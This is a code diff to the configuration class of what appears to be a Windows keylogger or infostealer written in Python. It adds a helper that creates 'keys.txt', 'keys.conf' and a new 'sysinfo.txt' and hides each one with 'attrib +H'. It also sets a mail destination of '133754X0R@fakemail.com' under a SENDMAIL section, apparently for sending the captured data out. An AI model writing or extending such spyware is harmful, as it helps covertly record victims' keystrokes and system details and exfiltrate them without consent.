@@ -15,28 +15,37 @@ class Config(ConfigParser):
 
         return self.parser
 
+    @staticmethod
+    def place_and_hide(fp_list: list):
+
+        # For each filepath provided we 'touch' a matching file
+        for fp in fp_list:
+            # Write file, but write nothing
+            with open(fp, 'a') as _:
+                pass
+
+            # Set windows file attribute '+H' which marks the file as 'hidden'
+            subprocess.check_call(['attrib', '+H', fp])
+
     def first_write(self):
         file_name = 'keys.txt'
         conf_file_name = 'keys.conf'
+        sysinfo_file_name = 'sysinfo.txt'
 
         makedirs(usr_src, exist_ok=True)
 
         key_filepath = Path(usr_src, file_name)
         conf_filepath = Path(usr_src, conf_file_name)
+        sysinfo_filepath = Path(usr_src, sysinfo_file_name)
 
-        with open(key_filepath, 'a') as _:
-            pass
+        data_files = [key_filepath, conf_filepath, sysinfo_filepath]
 
-        subprocess.check_call(["attrib", "+H", key_filepath])
-
-        with open(conf_filepath, 'a'):
-            pass
-
-        subprocess.check_call(["attrib", "+H", conf_filepath])
+        self.place_and_hide(data_files)
 
         defaults = {
             'FILES': {
                 'key-store': key_filepath,
+                'sysinfo-store': sysinfo_filepath
             },
             'SENDMAIL.PARTIES': {
                 'dest': '133754X0R@fakemail.com',
